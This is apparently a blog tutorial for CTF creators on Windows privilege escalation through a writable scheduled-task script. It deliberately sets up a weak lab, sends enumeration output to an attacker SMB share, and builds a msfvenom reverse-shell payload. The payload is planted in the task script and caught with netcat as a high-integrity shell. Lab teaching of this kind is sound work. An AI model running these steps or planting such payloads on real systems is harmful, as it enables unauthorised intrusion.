# Windows Local Privilege Escalation - Scheduled Tasks for CTF Creators



# Scheduled Tasks

Scheduled tasks, as the name implies, are tasks that are scheduled to be executed at specific time intervals. These tasks can be configured using Windows' built-in Task Scheduler service. This service can monitor the time or event criteria that we choose and then execute the task when those criteria are met.

The Task Scheduler is automatically installed in multiple Microsoft operating systems:

- Task Scheduler 1.0: Installed with Windows Server 2003, Windows XP, and Windows 2000 operating systems.
- Task Scheduler 2.0: Installed with Windows Vista and Windows Server 2008.

The [official documentation](https://docs.microsoft.com/en-us/windows/win32/taskschd/task-scheduler-start-page) has following details:

>Tasks can be scheduled to execute in response to these events, or triggers.
> -   When a specific system event occurs.
> -   At a specific time.
> -   At a specific time on a daily schedule.
> -   At a specific time on a weekly schedule.
> -   At a specific time on a monthly schedule.
> -   At a specific time on a monthly day-of-week schedule.
> -   When the computer enters an idle state.
> -   When the task is registered.
> -   When the system is booted.
> -   When a user logs on.
> -   When a Terminal Server session changes state.

## Task

The documentation specifies the following:

> The following list contains a brief description of each task component:
>
>-   Triggers: Task Scheduler uses event or time-based triggers to know when to start a task. Every task can specify one or more triggers to start the task.
    
    For more information about triggers, see [Task Triggers](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-triggers).
>    
>-   Actions: These are the actions, the actual work, that is performed by the task. Every task can specify one or more actions to complete its work.
>    
>    For more information about actions, see [Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions).
>    
>-   Principals: Principals define the security context in which the task is run. For example, a principal might define a specific user or user group that can run the task.
>    
>    For more information about principals, see [Security Contexts for Tasks](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks).
>    
> -   Settings: These are the settings that the Task Scheduler uses to run the task with respect to conditions that are external to the task itself. For example, these settings can specify the priority of the task with respect to other tasks, whether multiple instances of the task can be run, how the task is handled when the computer is in an idle condition, and other conditions.

Based on the descriptions above, we're interested in the principal (security context) in which a task is executed. If a tasks can be modified/edited but it runs high privileges, it could be leveraged to elevate our privileges.

# Configuration

Create a directory to store tasks.

```powershell
md "C:\Schedule"
```

Grant full permissions to `Authenticated Users` groups on the directory.

```powershell
icacls "C:\Schedule" /grant "Autheticated Users:F"
```

Enable remote unsigned scripts and signed scripts downloaded from the Internet. This command must executed as administrator.

```powershell
powershell.exe /c Set-ExecutionPolicy remotesigned
```

Create a PowerShell script.

```
Write-Host "Hello World!" > HelloWorld.ps1
```

# Privilege Escalation via Scheduled Tasks

Using the command line, we can view information that is nearly identical and list the scheduled tasks:

```powershell
PS C:\Users\user> schtasks /query /fo LIST /v

Folder: \
HostName:                             desktop-bn
TaskName:                             \OneDrive Reporting Task-S-1-5-21-264094270-2388996790-3434637240-1001
Next Run Time:                        3/8/2022 1:50:48 PM
Status:                               Ready
Logon Mode:                           Interactive only
Last Run Time:                        3/7/2022 1:51:33 PM
Last Result:                          0
Author:                               Microsoft Corporation
Task To Run:                          %localappdata%\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe /reporting
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode
Run As User:                          user
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 02:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        One Time Only, Hourly
Start Time:                           1:50:48 PM
Start Date:                           3/3/2022
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        24 Hour(s), 0 Minute(s)
Repeat: Until: Time:                  None
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled

<...SNIP...>

PS C:\Users\user> schtasks /query /fo TABLE /nh

Folder: \
OneDrive Reporting Task-S-1-5-21-2640942 3/8/2022 1:50:48 PM    Ready
OneDrive Standalone Update Task-S-1-5-21 3/8/2022 3:29:47 PM    Ready

Folder: \Microsoft
INFO: There are no scheduled tasks presently available at your access level.
<...SNIP...>
```

Alternatively, we can also enumerate the scheduled tasks using PowerShell:

```powershell
PS C:\Users\user> Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

TaskName                                                                      TaskPath State
--------                                                                      -------- -----
OneDrive Reporting Task-S-1-5-21-264094270-2388996790-3434637240-1001         \        Ready
OneDrive Standalone Update Task-S-1-5-21-264094270-2388996790-3434637240-1001 \        Ready
<...SNIP...>
```

Alternatively, we could also use `autorunsc.exe` from SysInternals:

```powershell
PS C:\Users\user> C:\Tools\SysinternalsSuite\autorunsc64.exe -a t | more

Sysinternals Autoruns v14.09 - Autostart program viewer
Copyright (C) 2002-2022 Mark Russinovich
Sysinternals - www.sysinternals.com


Task Scheduler
   \OneDrive Reporting Task-S-1-5-21-264094270-2388996790-3434637240-1001
     "%localappdata%\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe" /reporting
     Standalone Updater
     Microsoft Corporation
     22.22.130.1
     c:\users\user\appdata\local\microsoft\onedrive\onedrivestandaloneupdater.exe
     7/15/1925 11:33 PM
<...SNIP...>
```

> Note: In the commands above we were able to list scheduled tasks that run with the integrity level of the current user. This means that if the tasks runs with a higher integrity level we must execute those commands as Administrator in order to enumerate them.

Here is an example of tasks running with higher integrity levels, I'm running PowerShell as **administrator**:

```powershell
PS C:\Windows\system32> Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

TaskName                                                                      TaskPath State
--------                                                                      -------- -----
Custom Task                                                                   \        Ready
MicrosoftEdgeUpdateTaskMachineCore                                            \        Ready
MicrosoftEdgeUpdateTaskMachineUA                                              \        Ready
OneDrive Reporting Task-S-1-5-21-264094270-2388996790-3434637240-1001         \        Ready
OneDrive Reporting Task-S-1-5-21-264094270-2388996790-3434637240-500          \        Ready
OneDrive Standalone Update Task-S-1-5-21-264094270-2388996790-3434637240-1001 \        Ready
OneDrive Standalone Update Task-S-1-5-21-264094270-2388996790-3434637240-500  \        Ready
```

Let's enumerate this tasks with Medium Integrity Level command line:

```powershell
PS C:\Users\user> schtasks /query /tn "Custom Task" /xml
ERROR: Access is denied.
```

If we execute the same from a PowerShell console running as **administrator** (High Integrity Level):

```xml
PS C:\Windows\system32> schtasks /query /tn "Custom Task" /xml
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2022-03-07T16:52:35</Date>
    <Author>desktop-bn\user</Author>
    <URI>\Custom Task</URI>
  </RegistrationInfo>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
    </Principal>
  </Principals>
  <Settings>
    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <IdleSettings>
      <Duration>PT10M</Duration>
      <WaitTimeout>PT1H</WaitTimeout>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
  </Settings>
  <Triggers>
    <TimeTrigger>
      <StartBoundary>2022-03-07T16:52:00</StartBoundary>
      <Repetition>
        <Interval>PT1M</Interval>
      </Repetition>
    </TimeTrigger>
  </Triggers>
  <Actions Context="Author">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>/c C:\Schedule\helloworld.ps1</Arguments>
    </Exec>
  </Actions>
</Task>
```

There's an user ID with the following SID value:

```xml
<UserId>S-1-5-18</UserId>
```

Query this SID to the FullName:

```powershell
PS C:\Windows\system32> wmic useraccount where sid='S-1-5-18'
Unexpected switch at this level.
```

> Note: This happens with PowerShell, use the Command Prompt instead.

Well if we use the command prompt as administrator:

```powershell
C:\Windows\system32>wmic useraccount where sid='S-1-5-18'
No Instance(s) Available.
```

However, since this SID belongs to `NT AUTHORITY\SYSTEM`, we aren't able to query it. Alright to fix this issue we must configure the `user` of the scheduled tasks:

{{< image src="/images/posts/custom-task-properties.png" caption="Lighthouse " src_s="/images/posts/custom-task-properties.png" src_l="/images/posts/custom-task-properties.png" >}}

> Note: We must tick `Run with highest privileges` in order to be able elevate privileges.

Now we fixed that issue since the user is not `NT AUTHORTY\SYSTEM`:

```xml
PS C:\Windows\system32> schtasks /query /tn "Custom Task" /xml
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2022-03-07T16:52:35</Date>
    <Author>desktop-bn\user</Author>
    <URI>\Custom Task</URI>
  </RegistrationInfo>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-21-264094270-2388996790-3434637240-1001</UserId>
      <LogonType>Password</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
  </Settings>
  <Triggers>
    <TimeTrigger>
      <StartBoundary>2022-03-07T16:52:00</StartBoundary>
      <Repetition>
        <Interval>PT1M</Interval>
      </Repetition>
    </TimeTrigger>
  </Triggers>
  <Actions Context="Author">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>/c C:\Schedule\helloworld.ps1</Arguments>
    </Exec>
  </Actions>
</Task>
```

Since we changed the user the SID changed:

```xml
<UserId>S-1-5-21-264094270-2388996790-3434637240-1001</UserId>
```

Now let's attempt to query this SID with a command prompt with low privileges, it doesn't need to be a console running as administrator:

```powershell
C:\Windows\system32>wmic useraccount where sid='S-1-5-21-264094270-2388996790-3434637240-1001'
AccountType  Caption               Description  Disabled  Domain           FullName  InstallDate  LocalAccount  Lockout  Name  PasswordChangeable  PasswordExpires  PasswordRequired  SID                                            SIDType  Status
512          desktop-bn\user               FALSE     desktop-bn                         TRUE          FALSE    user  TRUE                FALSE            FALSE             S-1-5-21-264094270-2388996790-3434637240-1001  1        OK


```

We can also get SID of the user (reverse query):

```powershell
C:\Windows\system32>wmic useraccount where name='user' get sid
SID
S-1-5-21-264094270-2388996790-3434637240-1001
```

It is also running with the highest privileges (High Integrity Level):

```xml
<RunLevel>HighestAvailable</RunLevel>
```

Is triggered (executed) at a time interval of every minute:

```xml
  <Triggers>
    <TimeTrigger>
      <StartBoundary>2022-03-07T16:52:00</StartBoundary>
      <Repetition>
        <Interval>PT1M</Interval>
      </Repetition>
    </TimeTrigger>
  </Triggers>
```

We can see the following action (what it executes) as well:

```xml
  <Actions Context="Author">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>/c C:\Schedule\helloworld.ps1</Arguments>
    </Exec>
  </Actions>
```

Still, the only way that we could find these scheduled tasks named "Custom Task" is by running a console as administrator or by using the Task Scheduler application and this is because we **CREATED** these tasks to run as `NT AUTHORITY\SYSTEM`. Therefore the only way to enumerate these tasks is by using the Administrator user or a High Integrity Level process. However, we did create a schedule using the GUI with our current user although by default it runs with `High Integrity Level` because otherwise, we wouldn't be able to create scheduled tasks that are configured to run `High Integrity Level`,  i.e, the `Run with highest privileges` setting. We can see this integrity level from the token with Process Hacker:

{{< image src="/images/posts/task-scheduler-mmc.png" caption="Task Scheduler MMC " src_s="/images/posts/task-scheduler-mmc.png" src_l="/images/posts/task-scheduler-mmc.png" >}}

The problem is in the fact that we did the following parameter `/ru "NT AUTHORITY\SYSTEM"`:

```powershell
C:\Windows\system32>schtasks /create /sc minute /mo 5 /tn "Custom Task 2" /tr "powershell.exe /c C:\Schedule\helloworld.ps1" /ru "NT AUTHORITY\SYSTEM"
SUCCESS: The scheduled task "Custom Task 2" has successfully been created.

C:\Windows\system32>schtasks /create /sc minute /mo 5 /tn "Custom Task 3" /tr "powershell.exe /c C:\Schedule\helloworld.ps1" /ru "desktop-bn\user"
SUCCESS: The scheduled task "Custom Task 3" has successfully been created.

PS C:\Windows\system32> schtasks /create /sc minute /mo 5 /tn "Custom Task 4" /tr "powershell.exe /c C:\Schedule\helloworld.ps1" /ru "desktop-bn\user" /rl Highest
SUCCESS: The scheduled task "Custom Task 4" has successfully been created.
```

> Note: The `/RL Highest` option is the setting of `Run with highest privileges`. In order to use this option you must be running from an administrator command line.

As we can see running Autoruns GUI (as a normal user) with our current user:

{{< image src="/images/posts/task-scheduler-autorun-fix.png" caption="Task Scheduler AutoRun Fix " src_s="/images/posts/task-scheduler-autorun-fix.png" src_l="/images/posts/task-scheduler-autorun-fix.png" >}}

Now we know that we **SHOULD NOT** create tasks that run as `NT AUTHORITY\SYSTEM`. I'm gonna disable all the tasks that we don't need:

{{< image src="/images/posts/task-scheduler-disabled-task.png" caption="Task Scheduler Disabled Tasks " src_s="/images/posts/task-scheduler-disabled-task.png" src_l="/images/posts/task-scheduler-disabled-task.png" >}}

If we execute all the previous commands we should be able to enumerate the scheduled tasks from a Medium Integrity Level command line:

```powershell
PS C:\Users\user> whoami /groups | findstr /i 'medium'
Mandatory Label\Medium Mandatory Level                        Label            S-1-16-8192
```

What I would do is send those outputs to my attacker's machine. I'm gonna start an SMB server on my attacker host:

```shell
❯ sudo impacket-smbserver share . -smb2support -username low -password 'p@ssw0rd'
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Then I'm gonna send the output of each of these commands and send it to a file on my attacker host through SMB:

```shell
PS C:\Users\user> $pass = ConvertTo-SecureString 'p@ssw0rd' -AsPlainText -Force

PS C:\Users\user> $cred = New-Object System.Management.Automation.PSCredential('low', $pass)

PS C:\Users\user> New-PSDrive -Name "share" -PSProvider "FileSystem" -Root "\\192.168.119.130\share" -Credential $cred

Name           Used (GB)     Free (GB) Provider      Root                                                                                                                              CurrentLocation
----           ---------     --------- --------      ----                                                                                                                              ---------------
share                                  FileSystem    \\192.168.119.130\share

PS C:\Users\user> schtasks /query /fo LIST /v >> \\192.168.119.130\share\scheduled_list.txt

PS C:\Users\user> schtasks /query /fo TABLE /nh >> \\192.168.119.130\share\scheduled_table.txt

PS C:\Users\user> Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,StateGet-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State >> \\192.168.119.130\share\scheduled_pwsh.txt

PS C:\Users\user> schtasks /query /tn "Custom Task 4" /xml >> \\192.168.119.130\share\scheduled_task.txt
```

In the attacker host, we can read our files:

```shell
❯ ls scheduled_*
 scheduled_list.txt   scheduled_table.txt
 scheduled_pwsh.txt   scheduled_task.txt
```

Since we're in the attacker host, we can open a text editor such as Sublime Text:

{{< image src="/images/posts/subl-scheduled-tasks.png" caption="Sublime Text Scheduled Tasks " src_s="/images/posts/subl-scheduled-tasks.png" src_l="/images/posts/subl-scheduled-tasks.png" >}}

We now know there's an idle setting, let's see the trigger:

{{< image src="/images/posts/subl-scheduled-tasks-1.png" caption="Sublime Text Scheduled Tasks " src_s="/images/posts/subl-scheduled-tasks-1.png" src_l="/images/posts/subl-scheduled-tasks-1.png" >}}

The time format according to [MSDN](https://docs.microsoft.com/en-us/windows/win32/taskschd/repetitionpattern-interval)is the following:

> The amount of time between each restart of the task. The format for this string is `P<days>DT<hours>H<minutes>M<seconds>S` (for example, "PT5M" is 5 minutes, "PT1H" is 1 hour, and "PT20M" is 20 minutes).

Based on the XML data of the scheduled task, the trigger runs every 5 minutes and the idle time has a duration of 10 minutes and it has a 1 hour timeout.

This is way better in my opinion as we can see things clearly:

{{< image src="/images/posts/subl-scheduled-task-2.png" caption="Sublime Text Scheduled Tasks " src_s="/images/posts/subl-scheduled-task-2.png" src_l="/images/posts/subl-scheduled-task-2.png" >}}

Now we're gonna verify the permissions of the `helloworld.ps1` script with icacls:

```powershell
PS C:\Users\user> icacls "C:\Schedule\helloworld.ps1"
C:\Schedule\helloworld.ps1 BUILTIN\Administrators:(I)(F)
                           NT AUTHORITY\SYSTEM:(I)(F)
                           BUILTIN\Users:(I)(RX)
                           NT AUTHORITY\Authenticated Users:(I)(M)

Successfully processed 1 files; Failed processing 0 files
```

The `Authenticated Users` have to modify permissions enabled and based on the following output we're in this group:

```powershell
PS C:\Users\user> whoami /groups | findstr /i 'authenticated users'
<...SNIP...>
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
```

We can also use accesschk.exe from SysInternals to enumerate the permissions:

```powershell
PS C:\Users\user> C:\Tools\SysinternalsSuite\accesschk.exe /accepteula -quvw user C:\Schedule\helloworld.ps1

Accesschk v6.14 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2021 Mark Russinovich
Sysinternals - www.sysinternals.com

RW C:\Schedule\helloworld.ps1
        FILE_ALL_ACCESS
```

Let's generate a payload for the system:

```shell
❯ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.130 LPORT=443 -f exe -o reverse.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: reverse.exe
```

Transfer the payload:

```powershell
PS C:\Users\user> copy \\192.168.119.130\share\reverse.exe C:\Tools\reverse.exe
PS C:\Users\user> dir C:\Tools\reverse.exe


    Directory: C:\Tools


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          3/7/2022   8:30 PM          73802 reverse.exe
```

> Note: In the real-world this would be an implant or an encrypted payload for C2 Frameworks, Cobalt Strike Beacons and so on.

Start a listener on Kali and then append a line to the script which runs the `reverse.exe` executable we created:

```powershell
echo "C:\Tools\reverse.exe" >> C:\Schedule\helloworld.ps1
```

Wait for the scheduled tasks to be executed and that should trigger the reverse shell as a **high-integrity level** process:

```shell
❯ nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.119.130] from (UNKNOWN) [192.168.119.129] 49961
Microsoft Windows [Version 10.0.22000.493]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /all
whoami /all

USER INFORMATION
----------------

User Name            SID
==================== =============================================
desktop-bn\user S-1-5-21-264094270-2388996790-3434637240-1001


GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes                                         
============================================================= ================ ============ ===============================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group 
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group 
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Performance Log Users                                 Alias            S-1-5-32-559 Mandatory group, Enabled by default, Enabled group 
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group 
NT AUTHORITY\INTERACTIVE                                      Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group 
CONSOLE LOGON                                                 Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group 
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group 
NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group 
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group 
LOCAL                                                         Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group 
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group 
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288                                                    


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled

ERROR: Unable to get user claims information.
```

As we can see we have elevated our privileges **medium integrity level** to **high integrity level**.

